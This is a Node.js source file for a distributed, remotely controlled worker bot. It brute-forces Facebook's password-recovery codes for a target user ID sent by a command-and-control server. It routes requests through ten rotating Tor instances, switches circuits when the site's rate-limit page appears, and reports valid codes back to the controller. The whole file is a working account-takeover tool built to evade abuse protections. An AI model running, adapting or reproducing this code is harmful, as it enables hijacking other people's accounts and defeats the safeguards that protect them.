const fs = require("fs");
const child_process = require("child_process");
const fetch = require("node-fetch");
const SocksProxyAgent = require('socks-proxy-agent').SocksProxyAgent;
const { io } = require("socket.io-client");

let consoleLog = "";
let consoleLog2 = "";
let consoleLog3 = "";

class Tor{
    static allConnectedTORs = [];
    static allinstancedTORs = [];
    static torCounter = 0;
    id = 0;
    dir = "";
    torfilePath = "";
    port = 0;
    doReconnect = true;
    isConnected = false;
    proc = null;
    pids = [];
    connResetCallback = null;

    constructor(callback){
        Tor.allinstancedTORs.push(this);
        Tor.torCounter += 1;
        this.connResetCallback = callback;
        this.id = Tor.torCounter + 0;
        this.dir = __dirname + "/tor_data_" + this.id
        this.torfilePath = this.dir + "/torrc_" + this.id;
        this.port = 10000 + this.id * 2;

        this.CreateTorrcFile();
        this.Connect(this);
    }

    CreateTorrcFile(){
        if(!fs.existsSync(this.dir)) fs.mkdirSync(this.dir)
        fs.writeFileSync(this.torfilePath, 
            `SOCKSPort ${this.port} 
            DataDirectory ${this.dir}/
            ControlPort ${this.port + 1} `
        )
    }

    Connect(instance){
        instance.proc = child_process.spawn("tor", ["-f", instance.torfilePath])
        instance.Setup();
    }

    Exit(){
        this.proc.kill("SIGINT")
    }

    Setup() {
        //consoleLog2 += "tor setup attempt \n"
        this.proc.on("close", ()=>{
            //consoleLog2 += "tor close \n"
            this.isConnected = false;
            let index = Tor.allConnectedTORs.indexOf(this)
            if(index > -1) Tor.allConnectedTORs.splice(Tor.allConnectedTORs.indexOf(this), 1);   
            //consoleLog2 += this.doReconnect   
            if(this.doReconnect) this.Connect(this);
        })
        this.proc.stderr.on('data', (data) => {
            console.error(`stderr: ${data}`);
            if(this.doReconnect) this.Connect(this);
        });
        this.proc.stdout.on('data', (data) => {
            if (data.toString().includes("100% (done)")) {
                consoleLog += "tor isConnected \n"
                this.isConnected = true;
                this.pids.push(this.proc.pid);
                this.connResetCallback();
                //Tor.allConnectedTORs.push(this);
            }
        });
    }

    static GetAvailableTor(callback){
        if(Tor.allConnectedTORs.length == 0) setTimeout(()=>{Tor.GetAvailableTor(callback)}, 1000)
        else {
            let availableTor = Tor.allinstancedTORs[Tor.allConnectedTORs.length - 1];
            Tor.allConnectedTORs.splice(Tor.allConnectedTORs.length - 1, 1);    
            callback(availableTor)
        }
    }
}

class WorkerChild{
    doWork = true;
    value = true;
    status = {
        got_conn_attempt : 0,
        got_conn_sucess : 0,
        done_count : 0
    }
    usingTor = null;
    torID = 0;
    workerTor = null;
    
    constructor (){
        this.workerTor = new Tor(()=>{this.TorConnResetCallback(this)});
        this.loadCount = 0;
        this.hasGotTorConnection = false;
        //this.doWork = false;
        this.agent = null;
        this.torPort = 0;
        this.unresolvedCodes = [];
        WorkerChild.allWorkerChildren.push(this);
        let classInstance = this;
        setInterval(()=>{this.Tick(classInstance)}, 20);
    }

    TorConnResetCallback(classInstance){
        classInstance.torPort = classInstance.workerTor.port;
        classInstance.agent = new SocksProxyAgent("socks5://localhost:" + classInstance.torPort);
        classInstance.hasGotTorConnection = true;
        classInstance.status["got_conn_sucess"]++;
        classInstance.status["got_conn"] = true;
    }
    
    GetNewTorConnection(){
        //consoleLog2 += "GetNewTorConnection " + this.hasGotTorConnection + "\n"
        this.torID++;
        this.hasGotTorConnection = false;
        this.status["got_conn"] = false;
        this.status["got_conn_attempt"]++;
        this.workerTor.Exit();
    }
    
    Tick(classInstance){
        //consoleLog2 += "Tick \n"
        classInstance.status["unresolved_count"] = classInstance.unresolvedCodes.length;
        classInstance.status["load_count"] = classInstance.loadCount;
        if(!DO_WORK || !classInstance.doWork || !classInstance.hasGotTorConnection || WORKING_INDEX > LAST_INDEX) return;
        let underLoad = (classInstance.loadCount >= 50);
        let hasUnrs = (classInstance.unresolvedCodes.length > 0) ;
        if(hasUnrs) classInstance.DoFetch(classInstance.unresolvedCodes[classInstance.unresolvedCodes.length - 1], true);
        if(!hasUnrs && !underLoad) {
            classInstance.DoFetch(DATABASE[WORKING_INDEX], false);
            WORKING_INDEX++;
        }
    }
    static allWorkerChildren = [];
    
    DoFetch(code, isUnresolvedCode){
        let usingTorID = this.torID + 0;
        this.loadCount++;
        let res = null;
        fetch(BASE_URL + code, {agent: this.agent}).then(r=>{res = r; return r.text()}).then(t=>{
            let dt = t.includes("additional_content=");
            let dt2 = t.includes("type=\"text\"");            
            
            if(dt) {
                //console.log(dt + " :: " + dt2);
                if(this.unresolvedCodes.indexOf(code) == -1) this.unresolvedCodes.push(code);
                if(this.hasGotTorConnection && this.torID == usingTorID) {
                    this.GetNewTorConnection();
                }
            }else{
                DONE_COUNT++;
                this.status.done_count++;
            }
            
            if(isUnresolvedCode){
                this.unresolvedCodes.splice(this.unresolvedCodes.indexOf(code));
            }
            
            if(dt2) {
                //DO_WORK = false;
                fs.writeFile(__dirname + "/found_html_" + code + ".html", t, ()=>{})
                fs.writeFile(__dirname + "/found_html_" + code + "header.html", JSON.stringify(mapToObj(res.headers)), ()=>{})
                socket.emit("found", code);
                console.log(code);
            }
            /*if(code == "762367" || code == 762367){
                fs.writeFile(__dirname + "/t_html_" + code + ".html", t, ()=>{})
                fs.writeFile(__dirname + "/t_html_" + code + "header.html", JSON.stringify(mapToObj(res.headers)), ()=>{})
            }*/
            this.loadCount--;
        }).catch((err)=>{
            if(this.unresolvedCodes.indexOf(code) == -1) this.unresolvedCodes.push(code);
            this.loadCount--;
            console.log(err)
            //consoleLog += "fetch eeerrr"
        })
    }

    StartWorking(){
        this.doWork = true;
        console.log("doWork " +  this.doWork)
    }
    StopWorking(){
        this.doWork = false;
        this.unresolvedCodes.length = 0;
        console.log("doWork " +  this.doWork)
    }
}

let socket;

KillAllTorProcesses(()=>{
    socket = io(hostUrl);      

    socket.on("connect", () => {
        console.log(socket.id); // x8WIv7-mJelg7on_ALbx
        socket.on("start", async (data) => { 
            if(isSameMesageAgain("start")) return;
            console.log("start")
            let bData = data.split(",")
            UID = bData[0]
            START_INDEX = parseInt(bData[1])
            LAST_INDEX = parseInt(bData[2])
            WORKING_INDEX = START_INDEX;
            console.log("START_INDEX" + " :: " + START_INDEX)
            console.log("LAST_INDEX" + " :: " + LAST_INDEX)
            BASE_URL = "https://m.facebook.com/recover/password/?u=" + UID + "&n="
            Start();
        });
        socket.on("stop", async (data) => { 
            if(isSameMesageAgain("stop")) return;
            console.log("stop")
            Stop();
        });
    });

    socket.on("disconnect", (reason) => {
        console.log("disconnect")
    });
});


let BASE_URL = ""
let hostUrl = "https://BATHOST.tdss-user-shikto.repl.co"
let databaseUrl = "https://BATHOST.tdss-user-shikto.repl.co/database.txt"

let DATABASE = [];
let UID = 0;
let DO_WORK = false;
let START_INDEX = 0;
let LAST_INDEX = 0;
let WORKING_INDEX = 0;

let DONE_COUNT = 0;

let workers = []
for(k=0;k<10;k++) workers.push(new WorkerChild())

let randomTimeAdd = parseInt(Math.random() * 2000);
setTimeout(()=>{
    setInterval(()=>{
        if(DONE_COUNT == 0) return;
        let dc = DONE_COUNT + 0;
        DONE_COUNT = 0;
        socket.emit("done_count_add", dc);
    }, 10000)
} ,randomTimeAdd)

setInterval(()=>{ 
    if(DO_WORK){
        console.clear();
        //console.log(consoleLog3);
        console.log("Tor.allConnectedTORs.length : " + Tor.allConnectedTORs.length)
        for(i in WorkerChild.allWorkerChildren) console.log(WorkerChild.allWorkerChildren[i].status)
        //for(i in Tor.allinstancedTORs) console.log(Tor.allinstancedTORs[i].proc.pid)
    }
}, 1000)

let STARTING = false;
function Start() {
    if(DO_WORK) return;
    if(STARTING) return;
    STARTING = true;
    DONE_COUNT = 0;
    console.log("WORK STARTED: " + (LAST_INDEX - START_INDEX + 1));
    LoadDatabase(()=>{
        DO_WORK = true;
        console.log("children c : " + WorkerChild.allWorkerChildren.length)
        for(let i in WorkerChild.allWorkerChildren) WorkerChild.allWorkerChildren[i].StartWorking();
    });
}
function Stop() {
    STARTING = false;
    DO_WORK = false;
    for(let i in WorkerChild.allWorkerChildren) WorkerChild.allWorkerChildren[i].StopWorking();
}

function LoadDatabase(callback) {
    fetch(databaseUrl).then(r=>r.text().then(t=>{
        DATABASE = t.toString().split("\n");
        console.log(DATABASE);
        callback();
    }))
}

let lastMsg = "";
let lastTime = 0;
function isSameMesageAgain(msg){
    let result = false;
    let cTime = Date.now()  
    //console.log((cTime - lastTime))
    if(lastMsg == msg){
        if((cTime - lastTime) <= 2){
            result = true;
        }
    }
    lastMsg = msg    
    lastTime = cTime;
    return result;
}

function mapToObj(map){
    const obj = {}
    for (let [k,v] of map)
      obj[k] = v
    return obj
  }

function KillAllTorProcesses(callback) {
    let tProc = child_process.spawn("ps", ["-aux"]);
    tProc.stdout.on('data', (data) => {
        let bData = data.toString().split("\n");
        for(let i in bData){
            let dl = bData[i].split(" tor");
            if(dl.length > 1){
                let bdl = dl[0].split(" ");
                let count = 0;
                for(let j in bdl){
                    if(bdl[j].length > 1) count++;
                    if(count == 2){
                        process.kill(bdl[j]);
                        console.log("Killed PID: " + bdl[j]);
                        break;
                    }
                }
            }
        }
        callback();
    });
    tProc.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });
}
